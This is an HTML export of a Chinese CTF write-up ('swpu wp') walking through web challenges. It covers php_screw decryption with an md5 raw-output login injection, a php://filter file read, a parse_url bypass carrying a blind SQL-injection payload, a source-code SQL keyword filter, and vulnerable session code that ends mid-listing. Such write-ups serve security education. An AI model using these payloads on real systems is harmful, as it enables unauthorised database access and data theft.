@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        swpu wp - HackMD
+    </title>
+    <link rel="icon" type="image/png" href="http://hackmd.cheery.win/favicon.png">
+    <link rel="apple-touch-icon" href="http://hackmd.cheery.win/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/emojify.js/1.1.0/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,600,600italic,300italic,300|Source+Serif+Pro|Source+Code+Pro:400,300,500&subset=latin,latin-ext);.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\A0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,sans-serif;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,Hiragino Kaku Gothic Pro,\\30D2\30E9\30AE\30CE\89D2\30B4 Pro W3,Osaka,Meiryo,\\30E1\30A4\30EA\30AA,MS Gothic,"\FF2D\FF33   \30B4\30B7\30C3\30AF",sans-serif}.ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,"\FF2D\FF33   \FF30\30B4\30B7\30C3\30AF",sans-serif}.markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang TC,Microsoft JhengHei,\\5FAE\8EDF\6B63\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,\\5FAE\8EDF\6B63\9ED1UI,sans-serif}.markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft YaHei,\\5FAE\8F6F\96C5\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,\\5FAE\8F6F\96C5\9ED1UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:contain}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}small span{line-height:22px}small .dropdown{display:inline-block}small .dropdown a:focus,small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid"><h1 id="swpu-wp"><a class="anchor hidden-xs" href="#swpu-wp" title="swpu-wp"><span class="octicon octicon-link"></span></a>swpu wp</h1><h2 id="web"><a class="anchor hidden-xs" href="#web" title="web"><span class="octicon octicon-link"></span></a>web</h2><h3 id="你能进入后台吗？"><a class="anchor hidden-xs" href="#你能进入后台吗？" title="你能进入后台吗？"><span class="octicon octicon-link"></span></a>你能进入后台吗？</h3><p>出题思路:考察php_screw加密和md5加密后的注入。<br>
+题目解法：<br>
+备份文件index.php.bak，下载打开，可以发现代码经过加密处理<br>
+<img src="http://chuantu.biz/t6/127/1509879745x2918527170.png" alt=""><br>
+右键查看源代码，可以发现注释里面的crypt key<br>
+<img src="http://chuantu.biz/t6/127/1509879956x2101804615.jpg" alt=""><br>
+可以发现是php_screw加密，github上面搜索可以发现解密程序<br>
+根据https://github.com/firebroo/screw_decode解密即可<br>
+查看解密后的index.php.decode可以发现password经过md5($password,true)<br>
+<img src="http://chuantu.biz/t6/127/1509880082x2101804615.png" alt=""><br>
+提供个字符串ffifdyop，md5($password,true)加密后为’or’6&lt;trash&gt;，造成注入，<br>
+输入任意用户名，密码ffifdyop得flag:flag{mD5_1nject1on_pHp_scr3w_1nt3re5t1ng}</p><h3 id="flagflag"><a class="anchor hidden-xs" href="#flagflag" title="flagflag"><span class="octicon octicon-link"></span></a>flag!flag</h3><p>出题思路：本来是准备出另外一个洞的，偶然见看到了parse_url解析url的一个漏洞。然后决定出这个。</p><p>题目解法：首先进去时一个很明显的文件包含</p><blockquote>
+<p><a href="http://39.106.13.2/web2/file.php?file=index" target="_blank">http://39.106.13.2/web2/file.php?file=index</a><br>
+然后在web2目录下有index这个文件，所以猜测这里有文件包含，右键查看源代码发现有个check.php的提示，用php://filter/read=convert.base64-encode/resource=check可以读取源代码(之前配置出错然后回滚，导致有些师傅读的源码是之前写的源码，出题人已经被吊打)</p>
+</blockquote><pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+$_POST=Add_S($_POST);
+$_GET=Add_S($_GET);
+$_COOKIE=Add_S($_COOKIE);
+$_REQUEST=Add_S($_REQUEST);
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Add_S</span><span class="hljs-params">($array)</span></span>{
+        <span class="hljs-keyword">foreach</span>($array <span class="hljs-keyword">as</span> $key=&gt;$value){
+                <span class="hljs-keyword">if</span>(!is_array($value)){                                        $check=preg_match(<span class="hljs-string">'/regexp|like|and|\"|%|insert|update|delete|union|into|load_file|outfile|\/\*/i'</span>, $value);
+                        <span class="hljs-keyword">if</span>($check)
+                                {
+                                <span class="hljs-keyword">exit</span>(<span class="hljs-string">"Stop hacking by using SQL injection!"</span>);
+
+                        }
+
+                }<span class="hljs-keyword">else</span>{
+                        $array[$key]=Add_S($array[$key]);
+                }
+        }
+<span class="hljs-keyword">return</span> $array;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_url</span><span class="hljs-params">()</span>
+</span>{
+    $url=parse_url($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);
+    parse_str($url[<span class="hljs-string">'query'</span>],$query);
+    $key_word=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">"for"</span>,<span class="hljs-string">"like"</span>);
+    <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $key)
+    {
+        <span class="hljs-keyword">foreach</span>($key_word <span class="hljs-keyword">as</span> $value)
+        {
+		   <span class="hljs-keyword">foreach</span>($key_word <span class="hljs-keyword">as</span> $value)
+        {
+            			<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/"</span>.$value.<span class="hljs-string">"/"</span>,strtolower($key)))
+            {
+                			<span class="hljs-keyword">die</span>(<span class="hljs-string">"Stop hacking by using SQL injection!"</span>);
+            }
+        }
+    }
+}
+<span class="hljs-meta">?&gt;</span>
+                                                                                                                                                                
+</code></pre><p>代码还是很简单的，其实就是parse_url对url解析的时候有问题///x.php?file=xxx这种格式会返回false，preg_match就不会匹配到任何字符串了。<br>
+<a href="https://bugs.php.net/bug.php?id=55511" target="_blank">BUG#55111</a><br>
+所以最后的payload:<a href="http://39.106.13.2///web2/article_show_All.php?a_id=1" target="_blank">http://39.106.13.2///web2/article_show_All.php?a_id=1</a>’/(ascii(mid((select flag from flag)from(1)))&gt;0)%23<br>
+最后写一个脚本就能跑出flag:flag{08067_Fl4g_tsfaxiewinli}</p><h3 id="我们来做个小游戏吧"><a class="anchor hidden-xs" href="#我们来做个小游戏吧" title="我们来做个小游戏吧"><span class="octicon octicon-link"></span></a>我们来做个小游戏吧</h3><ul>
+<li>出题思路：考点在于全局转义的情况下如何引入单引号，从而注入得到我们需要的字段（感谢 @xyz 的出题）</li>
+</ul><p>下载源码，可以看到做了全局转义，而在 session.class.php 中：</p><pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">/**
+ * Created by PhpStorm.
+ * User: xyz
+ * Date: 2017/7/4
+ * Time: 9:29
+ */</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">session</span>
+</span>{
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(&amp;$db, $session_id=<span class="hljs-string">''</span>, $session_table = <span class="hljs-string">'session'</span>, $session_name=<span class="hljs-string">'SESSID'</span>)</span>
+    </span>{
+        <span class="hljs-keyword">$this</span>-&gt;dbConn  = $db;
+        <span class="hljs-keyword">$this</span>-&gt;session_name = $session_name;
+        <span class="hljs-keyword">$this</span>-&gt;session_table = $session_table;
+        <span class="hljs-keyword">$this</span>-&gt;_ip = <span class="hljs-keyword">$this</span>-&gt;real_ip();
+
+        <span class="hljs-keyword">if</span> ($session_id == <span class="hljs-string">''</span> &amp;&amp; !<span class="hljs-keyword">empty</span>($_COOKIE[<span class="hljs-keyword">$this</span>-&gt;session_name]))
+        {
+            <span class="hljs-keyword">$this</span>-&gt;session_id = $_COOKIE[<span class="hljs-keyword">$this</span>-&gt;session_name];
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            <span class="hljs-keyword">$this</span>-&gt;session_id = $session_id;
+        }
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;session_id)
+        {
+            $tmp_session_id = substr(<span class="hljs-keyword">$this</span>-&gt;session_id, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;gen_session_key($tmp_session_id) === substr(<span class="hljs-keyword">$this</span>-&gt;session_id, <span class="hljs-number">32</span>))
+            {
+                <span class="hljs-keyword">$this</span>-&gt;session_id = $tmp_session_id;
+            }
+            <span class="hljs-keyword">else</span>
+            {
+                <span class="hljs-keyword">$this</span>-&gt;session_id = <span class="hljs-string">''</span>;
+            }
+        }
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;session_id)
+        {
+            <span class="hljs-keyword">$this</span>-&gt;load_session();
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            <span class="hljs-keyword">$this</span>-&gt;gen_session_id();
+
+            setcookie(<span class="hljs-keyword">$this</span>-&gt;session_name, <span class="hljs-keyword">$this</span>-&gt;session_id . <span class="hljs-keyword">$this</span>-&gt;gen_session_key(<span class="hljs-keyword">$this</span>-&gt;session_id));
+        }
+
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_session</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;dbConn-&gt;query(<span class="hljs-string">'INSERT INTO '</span> . <span class="hljs-keyword">$this</span>-&gt;session_table . <span class="hljs-string">" (session_id, ip, data) VALUES ('"</span> . <span class="hljs-keyword">$this</span>-&gt;session_id .<span class="hljs-string">"', '"</span>. <span class="hljs-keyword">$this</span>-&gt;_ip .<span class="hljs-string">"', 'a:2:{s:4:\"name\";s:5:\"guest\";s:5:\"score\";s:1:\"0\";}')"</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_session</span><span class="hljs-params">()</span>
+    </span>{
+        $res = <span class="hljs-keyword">$this</span>-&gt;dbConn-&gt;query(<span class="hljs-string">'SELECT data FROM '</span> . <span class="hljs-keyword">$this</span>-&gt;session_table . <span class="hljs-string">" WHERE session_id = '"</span> . <span class="hljs-keyword">$this</span>-&gt;session_id . <span class="hljs-string">"' and ip = '"</span> . <span class="hljs-keyword">$this</span>-&gt;_ip . <span class="hljs-string">"'"</span>);
+        $session = $res-&gt;fetch_array();
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($session))
+        {
+            <span class="hljs-keyword">$this</span>-&gt;insert_session();
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            $GLOBALS[<span class="hljs-string">'_SESSION'</span>]  = unserialize($session[<span class="hljs-string">'data'</span>]);
+        }
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_session</span><span class="hljs-params">()</span>
+    </span>{
+        $data = serialize($GLOBALS[<span class="hljs-string">'_SESSION'</span>]);
+
+        $data = addslashes($data);
+
